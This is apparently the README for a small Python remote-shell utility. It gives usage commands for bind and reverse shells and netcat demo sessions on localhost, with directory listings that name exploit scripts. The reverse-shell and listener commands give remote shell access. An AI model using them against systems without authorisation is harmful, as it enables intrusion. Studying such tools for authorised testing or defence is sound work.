## Shellcat
A computer networking utility for create shell from or connect shell to servers. 
This is the best, simplest, smallest, easiest and friendliest tool that can support
enough basic features for remote shell. Athough the options still less and simple, but if 
Github community likes this tool, I will grow this more with more features and cleaner
work.

## Usage
Bind shell: `python[3] pysh.py PORT`  
Reverse shell: `python[3] pysh.py HOST PORT`

## UI
#### Bind:
```shell
shelld3v@sh1:~$ python pysh.py 4242
Listening on 4242 ...
Connected from 127.0.0.1 to [0.0.0.0] 4244
```
```shell
shelld3v@sh2:~$ nc 127.0.1 4242
sh: limited access in this shell
sh-1.0$ whoami
shelld3v
sh-1.0$ ls
crypto.sh
dirsearch
exploit.py
exploit.sh
flunym0us
frag.c
frag.sh
gitlab
go
go1.12.9.linux-amd64.tar.gz
HTTP
nginxrce.py
oracle2.py
oracle.py
phprce.py
richfaces-elinjection.py
wordpress9978.py
sh-1.0$ uname -a
Linux sh2 4.4.0-17763-Microsoft #1217-Microsoft Mon May 05 16:09:00 PST 2020 x86_64 GNU/Linux
sh-1.0$ w
 20:09:33 up  3:32,  0 users,  load average: 0.52, 0.58, 0.59
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
sh-1.0$ exit
exit
```
#### Reverse:
```shell
shelld3v@sh1:~$ python pysh.py 127.0.1 4242
Connected from 0.0.0.0 to [127.0.0.1] 4242
```
```shell
shelld3v@sh2:~$ nc -lvp 4242
listening on [any] 4242 ...
connect to [127.0.0.1] from sh1 [127.0.0.1] 32634
sh: limited access in this shell
sh-1.0$ whoami
shelld3v
sh-1.0$ ls
crypto.sh
dirsearch
exploit.py
exploit.sh
flunym0us
frag.c
frag.sh
gitlab
go
go1.12.9.linux-amd64.tar.gz
HTTP
nginxrce.py
oracle2.py
oracle.py
phprce.py
richfaces-elinjection.py
wordpress9978.py
sh-1.0$ uname -a
Linux sh1 4.4.0-17763-Microsoft #1217-Microsoft Mon May 05 16:09:00 PST 2020 x86_64 GNU/Linux
sh-1.0$ w
 20:09:33 up  3:32,  0 users,  load average: 0.52, 0.58, 0.59
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
sh-1.0$ exit
exit
```
